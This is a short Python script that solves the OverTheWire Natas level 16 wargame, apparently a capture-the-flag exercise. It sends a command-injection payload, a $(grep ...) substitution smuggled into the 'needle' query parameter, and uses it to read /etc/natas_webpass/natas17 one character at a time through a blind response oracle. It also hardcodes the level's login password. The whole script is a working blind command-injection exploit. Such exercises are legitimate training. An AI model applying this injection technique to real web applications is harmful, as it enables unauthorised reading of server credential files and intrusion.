import requests,string

url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

characters = ''.join([string.ascii_letters,string.digits])

password = []
for i in range(1,34):
    for char in characters:
        uri = "{0}?needle=$(grep -E ^{1}{2}.* /etc/natas_webpass/natas17)hackers".format(url,''.join(password),char)
        r = requests.get(uri, auth=(auth_username,auth_password))
        if 'hackers' not in r.text:
            password.append(char)
            print(''.join(password).ljust(32, "*"))
            break
        else: continue